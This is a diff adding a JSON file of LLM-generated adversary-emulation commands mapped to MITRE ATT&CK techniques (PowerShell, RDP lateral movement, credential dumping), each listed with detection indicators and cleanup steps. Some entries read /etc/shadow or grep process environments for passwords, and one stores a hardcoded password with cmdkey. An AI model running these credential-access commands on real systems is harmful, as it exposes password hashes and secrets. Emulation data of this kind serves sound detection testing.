+        "command_id": "02f326f7-4031-4c0c-a69c-05e5cf3efd63",
+        "ttp_id": "real-T1059.001",
+        "mitre_attack_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "tactic": "Execution",
+        "platform": "linux",
+        "name": "Simulate PowerShell script execution to create a directory and write a text file",
+        "command": "pwsh -c \"New-Item -ItemType Directory -Path /tmp/test_dir; Add-Content -Path /tmp/test_dir/test.txt -Value 'This is a test file created by PowerShell.';\"",
+        "explanation": "This command executes a PowerShell script that creates a directory named `test_dir` inside the `/tmp/` directory and then creates a text file named `test.txt` inside the newly created directory. It adds a simple text string as content. This simulates a basic attacker action of creating persistence or storing information.",
+        "indicators": [
+          "Process creation event for `pwsh`.",
+          "Directory creation event for `/tmp/test_dir`.",
+          "File creation event for `/tmp/test_dir/test.txt`.",
+          "File modification event for `/tmp/test_dir/test.txt`."
+        ],
+        "prerequisites": [
+          "PowerShell (pwsh) must be installed on the Linux system."
+        ],
+        "cleanup": "rm -r /tmp/test_dir",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:54.268801",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.88,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "338cf134-bb9d-45f0-84d1-88f2015eaa3e",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "windows",
+        "name": "Establish RDP connection to a target system with saved credentials",
+        "command": "mstsc /v:192.168.1.100 /admin /f",
+        "explanation": "This command attempts to establish an RDP connection to the target IP address (192.168.1.100). The /admin switch specifies a connection to the console session, and /f forces the connection to full screen. The user credentials used will be those saved from a previous connection, or if none are saved, the user will be prompted for credentials.",
+        "indicators": [
+          "Event ID 4624 (Successful Logon) on the target system (source IP will be the attacking machine)",
+          "Event ID 4648 (A logon was attempted using explicit credentials) on the attacking machine (if credentials are provided in the command line)",
+          "Network traffic on port 3389 (or configured RDP port) between the attacking and target machines.",
+          "RDP session active on the target machine."
+        ],
+        "prerequisites": [
+          "RDP must be enabled on the target system (192.168.1.100).",
+          "A user account with appropriate permissions must exist on the target system.",
+          "Network connectivity between the attacking and target machines.",
+          "If not using saved credentials, the attacking user must know the credentials of a valid user account on the target machine. Otherwise, you will need to enter credentials during the RDP connection attempt."
+        ],
+        "cleanup": "Close the RDP session on the attacking machine. No specific cleanup is required on the target machine, as the RDP session closes automatically when the connection is terminated.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:59.990915",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.838,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "7bac8443-f53b-4337-9c48-b8201c054d39",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "windows",
+        "name": "Attempt RDP connection to a target system, prompting for credentials",
+        "command": "cmdkey /generic:192.168.1.101 /user:targetuser /pass:P@sswOrd123 && mstsc /v:192.168.1.101 /admin /f",
+        "explanation": "This command first uses `cmdkey` to store credentials for the target system (192.168.1.101) using the supplied username ('targetuser') and password ('P@sswOrd123').  Then, it launches mstsc to connect to the target system. The `/admin` switch specifies a connection to the console session, and `/f` forces full screen.",
+        "indicators": [
+          "Event ID 4624 (Successful Logon) on the target system (source IP will be the attacking machine).",
+          "Event ID 4648 (A logon was attempted using explicit credentials) on the attacking machine.",
+          "Network traffic on port 3389 (or configured RDP port) between the attacking and target machines.",
+          "RDP session active on the target machine.",
+          "Credential entries stored in the Windows Credential Manager (if the credential storage is successful)."
+        ],
+        "prerequisites": [
+          "RDP must be enabled on the target system (192.168.1.101).",
+          "A user account ('targetuser') with appropriate permissions must exist on the target system.",
+          "Network connectivity between the attacking and target machines.",
+          "The attacking machine must have administrative privileges to run the cmdkey command without prompting for user consent."
+        ],
+        "cleanup": "Close the RDP session on the attacking machine.  Remove the stored credential using `cmdkey /delete:192.168.1.101`.  Restart the attacking machine to clear the credential cache.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:59.990915",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.838,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "599778c7-0fa6-4e92-a10b-173bccef1bb8",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "linux",
+        "name": "Establish RDP Connection to a Windows Host via `rdesktop`",
+        "command": "rdesktop <windows_host_ip>:<port> -u <username> -p <password> -g <width>x<height>",
+        "explanation": "This command attempts to establish an RDP connection to a Windows host using the `rdesktop` client, which is a common open-source RDP client for Linux. It specifies the target Windows host's IP address and port (default 3389). The `-u` and `-p` options provide the username and password for authentication. The `-g` option sets the resolution of the RDP session.  This is a safe command because it only attempts to connect to a specified host, and does not perform any malicious actions on the target.  Replace `<windows_host_ip>`, `<port>`, `<username>`, `<password>`, `<width>`, and `<height>` with appropriate values for a test environment.",
+        "indicators": [
+          "Network connection attempts to port 3389 (or specified port) on the target Windows host.",
+          "Authentication logs on the Windows host (Security Event Log) indicating a successful or failed RDP login attempt.",
+          "Process execution of `rdesktop` on the Linux client.",
+          "Established RDP session on the Linux client (visible if the connection is successful)."
+        ],
+        "prerequisites": [
+          "A Linux machine with `rdesktop` installed (e.g., `sudo apt install rdesktop` on Debian/Ubuntu).",
+          "A Windows machine with RDP enabled and accessible from the Linux machine (firewall rules).",
+          "Valid credentials for a user account on the Windows machine.",
+          "Network connectivity between the Linux and Windows machines."
+        ],
+        "cleanup": "Close the `rdesktop` session.  No specific cleanup is required on the Linux side.  On the Windows side, review the security logs for any suspicious activity.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:17:05.380014",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.838,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "1db360f6-e2fa-4b14-aedf-bb153f6d068a",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "linux",
+        "name": "Attempt RDP Connection using `xfreerdp` with specified credentials.",
+        "command": "xfreerdp /v:<windows_host_ip> /u:<username> /p:<password> /cert-ignore",
+        "explanation": "This command leverages the `xfreerdp` client, another common open-source RDP client for Linux. The command attempts to connect to the specified Windows host using the provided username and password. The `/cert-ignore` option is included to bypass certificate verification for testing purposes, which is a common practice in controlled environments. Replace `<windows_host_ip>`, `<username>`, and `<password>` with the appropriate values.  This command is safe because it only initiates a connection and doesn't execute any commands on the remote host.",
+        "indicators": [
+          "Network connection attempts to port 3389 (or specified port) on the target Windows host.",
+          "Authentication logs on the Windows host (Security Event Log) indicating a successful or failed RDP login attempt.",
+          "Process execution of `xfreerdp` on the Linux client.",
+          "Established RDP session on the Linux client (visible if the connection is successful)."
+        ],
+        "prerequisites": [
+          "A Linux machine with `xfreerdp` installed (e.g., `sudo apt install freerdp-x11` on Debian/Ubuntu).",
+          "A Windows machine with RDP enabled and accessible from the Linux machine (firewall rules).",
+          "Valid credentials for a user account on the Windows machine.",
+          "Network connectivity between the Linux and Windows machines."
+        ],
+        "cleanup": "Close the `xfreerdp` session.  No specific cleanup is required on the Linux side.  On the Windows side, review the security logs for any suspicious activity.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:17:05.380014",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.838,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "50a8b947-b3a4-46be-8557-075cf7e8ab82",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "windows",
+        "name": "Credential Dumping Simulation",
+        "command": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount | Select-Object Name\"",
+        "explanation": "Simulates credential discovery using WMI",
+        "indicators": [
+          "WMI queries",
+          "User account enumeration"
+        ],
+        "prerequisites": [
+          "PowerShell available",
+          "WMI access"
+        ],
+        "cleanup": "No cleanup required",
+        "source": "windows_credential",
+        "generated_at": "2025-10-23T18:17:15.180602",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.833,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "006c64d4-6d08-4569-aed5-7a0db7fc32d1",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "linux",
+        "name": "Dump Shadow File Credentials (Linux)",
+        "command": "sudo cat /etc/shadow",
+        "explanation": "This command attempts to dump the contents of the /etc/shadow file. The shadow file stores password hashes. While not directly using a credential dumping tool like Mimikatz (which doesn't exist on Linux in the same way), this simulates credential access by trying to access sensitive files containing password information. This is a common first step in credential access attempts on Linux systems.",
+        "indicators": [
+          "Audit logs showing 'cat' command execution with sudo privileges.",
+          "File access attempts to /etc/shadow.",
+          "Potential for the output to be redirected to a file or piped to another command for analysis."
+        ],
+        "prerequisites": [
+          "Requires sudo privileges for the user executing the command.",
+          "User must have permissions to execute sudo."
+        ],
+        "cleanup": "No cleanup required. The command only reads a file.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:17:19.397020",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.833,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "cfb6613a-0659-4b1f-9b8d-f0a266041e0a",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "linux",
+        "name": "Access /proc Files for Password Harvesting (Linux)",
+        "command": "sudo grep -H -a 'password' /proc/*/environ 2>/dev/null",
+        "explanation": "This command attempts to find passwords stored in environment variables of running processes by searching the /proc filesystem. The /proc filesystem provides information about running processes. This command uses 'grep' to search for the string 'password' within the environment variables of each process. The '-H' option prints the filename (process ID).  The '-a' option treats binary files as text files. 2>/dev/null redirects standard error to /dev/null to suppress error messages from processes without environment variables. This simulates a common technique of searching for credentials in process memory, though it does not directly dump credentials but rather searches for them.",
+        "indicators": [
+          "Audit logs showing 'grep' command execution with sudo privileges.",
+          "File access attempts to files within the /proc directory.",
+          "Output containing potential password-related strings or environment variables.",
+          "High CPU utilization during execution if many processes are running."
+        ],
+        "prerequisites": [
+          "Requires sudo privileges for the user executing the command.",
+          "User must have permissions to execute sudo."
+        ],
+        "cleanup": "No cleanup required. The command only reads files.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:17:19.397020",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.833,
+        "safety_level": "medium",
+        "validated": true
+      }
+    ],
+    "errors": [],
+    "statistics": {
+      "total_ttps_processed": 6,
+      "total_commands_generated": 23,
+      "commands_by_platform": {
+        "windows": 11,
+        "linux": 12
+      },
+      "commands_by_tactic": {
+        "Credential Access": 7,
+        "Lateral Movement": 8,
+        "Initial Access": 4,
+        "Execution": 4
+      },
+      "generation_errors": 0,
+      "safety_violations": 0,
+      "successful_generations": 23,
+      "avg_generation_time_ms": 12430.210833333333,
+      "llm_api_calls": 12,
+      "last_generation_time": "2025-10-23T18:17:19.397020"
+    }
+  }
+}
